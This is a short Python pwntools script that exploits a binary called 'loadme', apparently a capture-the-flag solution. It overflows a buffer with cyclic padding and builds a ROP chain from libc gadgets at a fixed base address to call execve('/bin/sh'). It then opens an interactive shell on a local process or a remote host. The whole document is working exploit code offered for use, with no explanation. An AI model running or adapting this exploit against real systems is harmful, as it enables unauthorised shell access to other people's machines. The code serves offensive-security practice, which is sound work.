#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./loadme"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)
if args.GDB: gdb.attach(io, """
	b *main+533
""")

io.sendlineafter(b": ", b"/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x13370000
POP_RDI = libc.address + 0x000000000010f75b
POP_RAX = libc.address + 0x00000000000dd237
POP_RSI = libc.address + 0x0000000000110a4d
SYSCALL = libc.address + 0x00000000000a0d6f # xor edx, edx; syscall
payload = flat(
	cyclic(0x228, n=8),
	POP_RAX, 0x3b,
	POP_RDI, next(libc.search(b"/bin/sh")),
	POP_RSI, 0x0,
	SYSCALL)
io.sendlineafter(b": ", payload)
io.interactive()
